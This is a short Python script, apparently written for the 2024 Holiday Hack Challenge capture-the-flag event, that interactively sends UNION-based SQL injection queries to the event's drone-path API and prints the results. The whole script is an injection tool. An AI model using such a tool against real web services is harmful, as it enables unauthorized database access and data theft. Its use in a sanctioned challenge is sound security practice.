import requests
import urllib.parse

while True:
	query = input ("Query: ")
	query = "'UNION {}--".format(query)
	urlEncode_query = urllib.parse.quote_plus(query)
	print ("SENDING {} [{}]".format(query, urlEncode_query))
	r = requests.get("https://hhc24-dronepath.holidayhackchallenge.com/api/v1.0/drones?drone={}".format(urlEncode_query))
	if r.status_code != 200:
		print (r.status_code)
	else:
		print (r.text)
